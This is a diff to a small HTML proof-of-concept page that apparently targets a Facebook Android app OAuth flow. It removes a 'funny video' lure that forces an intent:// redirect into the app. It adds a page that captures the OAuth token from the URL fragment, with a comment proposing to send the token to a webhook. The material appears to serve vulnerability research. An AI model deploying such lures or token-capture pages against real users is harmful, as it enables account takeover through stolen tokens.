@@ -1,10 +1,15 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Click here to see a funny video</h1>
+    <h2>OAuth Callback PoC</h2>
+    <p id="token-display">Waiting for token...</p>
     <script>
-        // Forces the browser to open the Facebook app with our payload
-        window.location.href = "intent://test?bn=Y29tLmZhY2Vib29rLmthdGFuYQ==&bplo=avatar#Intent;scheme=sfbfi;package=com.facebook.katana;end;";
+        // Extract the fragment from the URL
+        const hash = window.location.hash;
+        if (hash) {
+            document.getElementById('token-display').innerText = "Captured: " + hash;
+            // Optional: You could also write a fetch() request here to send this hash to a webhook (like Burp Collaborator or RequestBin)
+        }
     </script>
 </body>
 </html>
